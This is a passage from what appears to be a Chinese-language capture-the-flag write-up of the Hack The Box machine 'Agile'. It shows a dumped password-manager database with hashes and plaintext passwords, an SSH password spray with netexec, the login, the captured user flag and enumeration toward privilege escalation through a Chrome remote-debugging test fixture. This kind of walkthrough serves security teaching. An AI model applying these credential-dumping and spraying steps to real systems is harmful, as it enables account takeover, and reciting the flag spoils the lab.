ST_SPATIAL_REFERENCE_SYSTEMS          </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ST_UNITS_OF_MEASURE                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ST_GEOMETRY_COLUMNS                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> STATISTICS                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLE_CONSTRAINTS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLE_CONSTRAINTS_EXTENSIONS          </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLES                                </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLES_EXTENSIONS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLESPACES_EXTENSIONS                </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TRIGGERS                              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> VIEW_ROUTINE_USAGE                    </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> VIEW_TABLE_USAGE                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> VIEWS                                 </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> COLUMN_PRIVILEGES                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ENGINES                               </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> OPTIMIZER_TRACE                       </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> PLUGINS                               </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> PROCESSLIST                           </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> PROFILING                             </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> SCHEMA_PRIVILEGES                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLESPACES                           </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> TABLE_PRIVILEGES                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> USER_PRIVILEGES                       </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ENABLED_ROLES                         </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> APPLICABLE_ROLES                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ADMINISTRABLE_ROLE_AUTHORIZATIONS     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ROLE_COLUMN_GRANTS                    </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ROLE_ROUTINE_GRANTS                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> ROLE_TABLE_GRANTS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> USER_ATTRIBUTES                       </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_SESSION_TEMP_TABLESPACES       </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_VIRTUAL                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_BUFFER_POOL_STATS              </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_BUFFER_PAGE                    </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMPMEM_RESET                   </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMPMEM                         </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TRX                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMP_PER_INDEX_RESET            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMP_RESET                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_DEFAULT_STOPWORD            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_METRICS                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TEMP_TABLE_INFO                </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_DELETED                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TABLESTATS                     </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMP                            </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TABLES                         </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_BEING_DELETED               </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_BUFFER_PAGE_LRU                </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CMP_PER_INDEX                  </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_CONFIG                      </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_CACHED_INDEXES                 </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_INDEX_TABLE                 </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_COLUMNS                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_FT_INDEX_CACHE                 </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_INDEXES                        </span>|<br>|<span class="hljs-string"> information_schema </span>|<span class="hljs-string"> INNODB_TABLESPACES                    </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> processlist                           </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> session_account_connect_attrs         </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> global_status                         </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> session_status                        </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> global_variables                      </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> session_variables                     </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> variables_info                        </span>|<br>|<span class="hljs-string"> performance_schema </span>|<span class="hljs-string"> persisted_variables                   </span>|<br>|<span class="hljs-string"> superpass          </span>|<span class="hljs-string"> users                                 </span>|<br>|<span class="hljs-string"> superpass          </span>|<span class="hljs-string"> passwords                             </span>|<br>+--------------------+---------------------------------------+<br>89 rows in set (0.01 sec)<br><br>mysql&gt; select <span class="hljs-symbol">*</span> from users;<br>select <span class="hljs-symbol">*</span> from users;<br>ERROR 1046 (3D000): No database selected<br>mysql&gt; sselect <span class="hljs-symbol">*</span> from superpass.users;<br>select <span class="hljs-symbol">*</span> from superpass.users;<br>+----+----------+--------------------------------------------------------------------------------------------------------------------------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> hashed_password                                                                                                          </span>|<br>+----+----------+--------------------------------------------------------------------------------------------------------------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> 0xdf     </span>|<span class="hljs-string"> $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> corum    </span>|<span class="hljs-string"> $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 </span>|<br>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> shiyan   </span>|<span class="hljs-string"> $6$rounds=200000$mUn/fLPlYLd/CAj5$RWO8cNhKGl4kVPXmlrTlPfzc.9abgX5yiTlaSl49VR9nT1fLz6DPENq6tKtApoJuMAY3.GWotfsmjBbEoQSiL0 </span>|<br>+----+----------+--------------------------------------------------------------------------------------------------------------------------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select <span class="hljs-symbol">*</span> from superpass.passwords;<br>select <span class="hljs-symbol">*</span> from superpass.passwords;<br>+----+---------------------+---------------------+----------------+----------+----------------------+---------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> created_date        </span>|<span class="hljs-string"> last_updated_data   </span>|<span class="hljs-string"> url            </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password             </span>|<span class="hljs-string"> user_id </span>|<br>+----+---------------------+---------------------+----------------+----------+----------------------+---------+<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> 2022-12-02 21:21:32 </span>|<span class="hljs-string"> 2022-12-02 21:21:32 </span>|<span class="hljs-string"> hackthebox.com </span>|<span class="hljs-string"> 0xdf     </span>|<span class="hljs-string"> 762b430d32eea2f12970 </span>|<span class="hljs-string">       1 </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> 2022-12-02 21:22:55 </span>|<span class="hljs-string"> 2022-12-02 21:22:55 </span>|<span class="hljs-string"> mgoblog.com    </span>|<span class="hljs-string"> 0xdf     </span>|<span class="hljs-string"> 5b133f7a6a1c180646cb </span>|<span class="hljs-string">       1 </span>|<br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> 2022-12-02 21:24:44 </span>|<span class="hljs-string"> 2022-12-02 21:24:44 </span>|<span class="hljs-string"> mgoblog        </span>|<span class="hljs-string"> corum    </span>|<span class="hljs-string"> 47ed1e73c955de230a1d </span>|<span class="hljs-string">       2 </span>|<br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> 2022-12-02 21:25:15 </span>|<span class="hljs-string"> 2022-12-02 21:25:15 </span>|<span class="hljs-string"> ticketmaster   </span>|<span class="hljs-string"> corum    </span>|<span class="hljs-string"> 9799588839ed0f98c211 </span>|<span class="hljs-string">       2 </span>|<br>|<span class="hljs-string">  8 </span>|<span class="hljs-string"> 2022-12-02 21:25:27 </span>|<span class="hljs-string"> 2022-12-02 21:25:27 </span>|<span class="hljs-string"> agile          </span>|<span class="hljs-string"> corum    </span>|<span class="hljs-string"> 5db7caa1d13cc37c9fc2 </span>|<span class="hljs-string">       2 </span>|<br>+----+---------------------+---------------------+----------------+----------+----------------------+---------+<br>5 rows in set (0.00 sec)<br><br>mysql&gt; <br></code></pre></td></tr></table></figure>
+
+<p>23、然后想着去破解下，结果发现都不对</p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>24、然后还了个思路去尝试看看，这些是不是就是密码</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ netexec ssh <span class="hljs-number">10.10.11.203</span> -u corum -p passwd.txt                           <br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [*] SSH-<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-OpenSSH_8.<span class="hljs-number">9</span>p1 Ubuntu-<span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">1</span><br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [-] corum:<span class="hljs-number">762</span>b430d32eea<span class="hljs-number">2f12970</span><br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [-] corum:<span class="hljs-number">5</span>b133f7a6a1c180646cb<br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [-] corum:<span class="hljs-number">47</span>ed1e73c955de230a1d<br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [-] corum:<span class="hljs-number">9799588839</span>ed<span class="hljs-number">0f98c211</span><br>SSH         <span class="hljs-number">10.10.11.203</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.10.11.203</span>     [+] corum:<span class="hljs-number">5d</span>b7caa1d13cc37c9fc2  Linux - Shell access!<br></code></pre></td></tr></table></figure>
+
+<p>25、结果还真是，那就直接登录吧</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs gauss">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh corum<span class="hljs-comment">@10.10.11.203            </span><br><span class="hljs-comment">The authenticity of host &#x27;10.10.11.203 (10.10.11.203)&#x27; can&#x27;t be established.</span><br><span class="hljs-comment">ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.</span><br><span class="hljs-comment">This key is not known by any other names.</span><br><span class="hljs-comment">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-comment">Warning: Permanently added &#x27;10.10.11.203&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-comment">corum@</span><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.203</span>&#x27;s password: <br>Welcome to Ubuntu <span class="hljs-number">22.04</span><span class="hljs-number">.2</span> <span class="hljs-built_in">LTS</span> (GNU/Linux <span class="hljs-number">5.15</span><span class="hljs-number">.0</span><span class="hljs-number">-60</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span><br><br>This <span class="hljs-keyword">system</span> has been minimized by removing packages <span class="hljs-keyword">and</span> content that are<br><span class="hljs-keyword">not</span> required on a <span class="hljs-keyword">system</span> that users <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">log</span> into.<br><br>To restore this content, you can <span class="hljs-keyword">run</span> the &#x27;unminimize&#x27; command.<br>Failed to connect to https:<span class="hljs-comment">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><br><br>The programs included with the Debian GNU/Linux <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described in the<br>individual files in /usr/share/doc<span class="hljs-comment">/*/copyright.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-comment">permitted by applicable law.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47</span><br><span class="hljs-comment">corum@agile:~$ id</span><br><span class="hljs-comment">uid=1000(corum) gid=1000(corum) groups=1000(corum)</span><br><span class="hljs-comment">corum@agile:~$</span><br></code></pre></td></tr></table></figure>
+
+<p>26、获取下第一个flag信息</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">corum@agile:~$ ls -la<br>total 48<br>drwxr-x---<span class="hljs-number"> 8 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root  root <span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root  root    <span class="hljs-number"> 9 </span>Feb <span class="hljs-number"> 6 </span><span class="hljs-number"> 2023 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>corum corum <span class="hljs-number"> 220 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>corum corum<span class="hljs-number"> 3771 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.bashrc<br>drwx------<span class="hljs-number"> 4 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.cache<br>drwxr-xr-x<span class="hljs-number"> 4 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.config<br>drwx------<span class="hljs-number"> 3 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.local<br>drwx------<span class="hljs-number"> 3 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.pki<br>-rw-r--r--<span class="hljs-number"> 1 </span>corum corum <span class="hljs-number"> 807 </span>Jan <span class="hljs-number"> 6 </span><span class="hljs-number"> 2022 </span>.profile<br>drwxrwxr-x<span class="hljs-number"> 3 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.pytest_cache<br>drwx------<span class="hljs-number"> 2 </span>corum corum<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.ssh<br>-rw-r-----<span class="hljs-number"> 1 </span>root  corum  <span class="hljs-number"> 33 </span>Sep<span class="hljs-number"> 29 </span>08:13 user.txt<br>corum@agile:~$ cat user.txt <br>e1e4d14a28c36aedb1c5edb8447f8520<br>corum@agile:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>27、继续枚举，发现了测试网站的运行</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs tap">corum@agile:~$ cd /app/<br>corum@agile:/app$ ls -la<br>total 36<br>drwxr-xr-x <span class="hljs-number"> 6 </span>root      root     <span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.<br>drwxr-xr-x<span class="hljs-number"> 20 </span>root      root     <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 20 </span><span class="hljs-number"> 2023 </span>..<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root      root     <span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 23 </span><span class="hljs-number"> 2023 </span>.pytest_cache<br>drwxr-xr-x <span class="hljs-number"> 5 </span>corum     runner   <span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>app<br>drwxr-xr-x <span class="hljs-number"> 9 </span>runner    runner   <span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>app-testing<br>-r--r----- <span class="hljs-number"> 1 </span>dev_admin www-data   <span class="hljs-number"> 88 </span>Jan<span class="hljs-number"> 25 </span><span class="hljs-number"> 2023 </span>config_prod.json<br>-r--r----- <span class="hljs-number"> 1 </span>dev_admin runner     <span class="hljs-number"> 99 </span>Jan<span class="hljs-number"> 25 </span><span class="hljs-number"> 2023 </span>config_test.json<br>-rwxr-xr-x <span class="hljs-number"> 1 </span>root      runner    <span class="hljs-number"> 557 </span>Sep<span class="hljs-number"> 29 </span>09:21 test_and_update.sh<br>drwxrwxr-x <span class="hljs-number"> 5 </span>root      dev_admin<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>venv<br>corum@agile:/app$ cat test_and_update.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment"># update prod with latest from testing constantly assuming tests are passing</span><br><br>echo &quot;Starting test_and_update&quot;<br>date<br><br><span class="hljs-comment"># if already running, exit</span><br>ps auxww | grep -v &quot;grep&quot; | grep -q &quot;pytest&quot; &amp;&amp; exit<br><br>echo &quot;Not already running. Starting...&quot;<br><br><span class="hljs-comment"># start in dev folder</span><br>cd /app/app-testing<br><br><span class="hljs-comment"># system-wide source doesn&#x27;t seem to happen in cron jobs</span><br>source /app/venv/bin/activate<br><br><span class="hljs-comment"># run tests, exit if failure</span><br>pytest -x 2&gt;&amp;1 &gt;/dev/null || exit<br><br><span class="hljs-comment"># tests good, update prod (flask debug mode will load it instantly)</span><br>cp -r superpass /app/app/<br>echo &quot;Complete!&quot;<br>corum@agile:/app$<br><br>corum@agile:/app$ cd app-testing/<br>corum@agile:/app/app-testing$ ls -la<br>total 48<br>drwxr-xr-x<span class="hljs-number"> 9 </span>runner runner<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root   root  <span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>..<br>drwxr-xr-x<span class="hljs-number"> 3 </span>runner runner<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 8 </span><span class="hljs-number"> 2023 </span>.cache<br>drwxrwxr-x<span class="hljs-number"> 3 </span>runner runner<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 25 </span><span class="hljs-number"> 2023 </span>.local<br>drwx------<span class="hljs-number"> 3 </span>runner runner<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 25 </span><span class="hljs-number"> 2023 </span>.pki<br>drwxr-xr-x<span class="hljs-number"> 3 </span>runner runner<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 13 </span><span class="hljs-number"> 2022 </span>.pytest_cache<br>-rw-r--r--<span class="hljs-number"> 1 </span>runner runner <span class="hljs-number"> 128 </span>Jan<span class="hljs-number"> 23 </span><span class="hljs-number"> 2023 </span>README.md<br>drwxr-xr-x<span class="hljs-number"> 2 </span>runner runner<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 25 </span><span class="hljs-number"> 2023 </span>__pycache__<br>-rw-r--r--<span class="hljs-number"> 1 </span>runner runner  <span class="hljs-number"> 95 </span>Jan<span class="hljs-number"> 23 </span><span class="hljs-number"> 2023 </span>requirements.txt<br>drwxr-xr-x<span class="hljs-number"> 9 </span>runner runner<span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 7 </span><span class="hljs-number"> 2023 </span>superpass<br>drwxr-xr-x<span class="hljs-number"> 3 </span>runner runner<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 6 </span><span class="hljs-number"> 2023 </span>tests<br>-rw-r--r--<span class="hljs-number"> 1 </span>runner runner  <span class="hljs-number"> 73 </span>Jan<span class="hljs-number"> 23 </span><span class="hljs-number"> 2023 </span>wsgi-dev.py<br>corum@agile:/app/app-testing$ cat wsgi-dev.py <br>from superpass.app import app, dev<br><br>if __name__ == &quot;__main__&quot;:<br>    dev()<br>corum@agile:/app/app-testing$<br><br>corum@agile:/app/app-testing/tests/functional$ ls -la<br>total 20<br>drwxr-xr-x<span class="hljs-number"> 3 </span>runner    runner<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 7 </span><span class="hljs-number"> 2023 </span>.<br>drwxr-xr-x<span class="hljs-number"> 3 </span>runner    runner<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 6 </span><span class="hljs-number"> 2023 </span>..<br>drwxrwxr-x<span class="hljs-number"> 2 </span>runner    runner<span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 29 </span>09:30 __pycache__<br>-rw-r-----<span class="hljs-number"> 1 </span>dev_admin runner  <span class="hljs-number"> 34 </span>Sep<span class="hljs-number"> 29 </span>09:30 creds.txt<br>-rw-r--r--<span class="hljs-number"> 1 </span>runner    runner<span class="hljs-number"> 2663 </span>Sep<span class="hljs-number"> 29 </span>09:30 test_site_interactively.py<br>corum@agile:/app/app-testing/tests/functional$ <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/24.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/25.png" srcset="/img/loading.gif" lazyload></p>
+<p>28、是没有权限读取这个文件的，通过查看  test_site_interactively.py 这个文件，发现上面那个Creds.txt 确实是存储着账号密码登信息。</p>
+<p>29、看到这个，突然想开，我们前面hosts里发现的那个一模一样的 test子域名的网站，其实是测试网站，还存在数据。。。</p>
+<p>30、绑定下这个域名</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.203 test.superpass.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10.11.203</span> test.superpass.htb<br></code></pre></td></tr></table></figure>
+
+<p>31、访问下</p>
+<p><code>http://test.superpass.htb/</code></p>
+<p>32、就是会自动跳转到主域名下， 继续看看规则是啥规则吧</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">@pytest.fixture(scope=<span class="hljs-string">&quot;session&quot;</span>)<br>def driver<span class="hljs-literal">()</span>:<br>    options = <span class="hljs-constructor">Options()</span><br>    #options.add<span class="hljs-constructor">_argument(<span class="hljs-string">&quot;--no-sandbox&quot;</span>)</span><br>    options.add<span class="hljs-constructor">_argument(<span class="hljs-string">&quot;--window-size=1420,1080&quot;</span>)</span><br>    options.add<span class="hljs-constructor">_argument(<span class="hljs-string">&quot;--headless&quot;</span>)</span><br>    options.add<span class="hljs-constructor">_argument(<span class="hljs-string">&quot;--remote-debugging-port=41829&quot;</span>)</span><br>    options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">gpu</span>&#x27;)</span><br>    options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">crash</span>-<span class="hljs-params">dumps</span>-<span class="hljs-params">dir</span>=<span class="hljs-operator">/</span><span class="hljs-params">tmp</span>&#x27;)</span><br>    driver = webdriver.<span class="hljs-constructor">Chrome(<span class="hljs-params">options</span>=<span class="hljs-params">options</span>)</span><br>    yield driver<br>    driver.close<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>
+
+<p>33、看来是的代理过来看看才行</p>
